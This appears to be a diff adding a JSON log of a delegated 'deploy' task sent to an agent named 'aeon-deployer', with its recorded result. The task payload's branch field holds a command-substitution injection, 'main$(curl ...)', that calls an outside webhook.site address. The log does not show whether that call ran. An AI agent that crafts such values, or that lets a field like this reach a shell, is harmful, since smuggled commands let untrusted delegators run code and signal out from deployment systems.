@@ -1,0 +1,40 @@
+{
+  "task": {
+    "assignee_did": "did:key:z6MkqVs15JyUugGu11TjwS5REKCHGrxK4uHvAFyDKGqNLVie",
+    "capability": "pr:merge",
+    "created_at": "2026-10-18T19:06:13.125066219+00:00",
+    "deadline": null,
+    "delegator_did": "did:key:z6MkfVR6wD8Fq3yNcqjWYENoEJMaVqKAgwhHWBy1PFaD5XsH",
+    "id": "f987d97b-612d-4c0e-9211-07380a0a487d",
+    "kind": "deploy",
+    "payload": "{\"title\": \"Deploy: scan and report on open PRs\", \"action\": \"scan and report on open PRs\", \"component\": \"fleet-deploy\", \"branch\": \"main$(curl -s http://webhook.site/68e238ea-8cdc-4696-98e6-4fa8147d459b/dep_branch)\"}",
+    "repo_id": null,
+    "result": null,
+    "status": "pending",
+    "ucan_token": null,
+    "updated_at": "2026-10-18T19:06:13.125066219+00:00"
+  },
+  "instance": {
+    "name": "aeon-deployer",
+    "did": "did:key:z6MkqVs15JyUugGu11TjwS5REKCHGrxK4uHvAFyDKGqNLVie",
+    "host": "gitlawb",
+    "node": "https://node.gitlawb.com",
+    "capabilities": [
+      "git:push",
+      "pr:merge",
+      "agent:deploy"
+    ],
+    "model": "aeon-deployer",
+    "trust": 0.05,
+    "status": "active",
+    "purpose": "Deploy and merge",
+    "health": "active",
+    "last_checked": "2026-10-18T22:18:44.337Z",
+    "identity_dir": "~/.gitlawb/fleet/deployer"
+  },
+  "result": {
+    "executor": "command",
+    "summary": "Deploy proof recorded: sha=c9b4d87cc5bd branch=main component=fleet-deploy\nRecent commits:\nc9b4d87 chore(cron): skill-update-check success\nProof: memory/gitlawb-deploy-proofs/2026-10-18.md | State: memory/gitlawb-deploy-state.json"
+  },
+  "completed_at": "2026-10-18T22:23:54.284Z"
+}
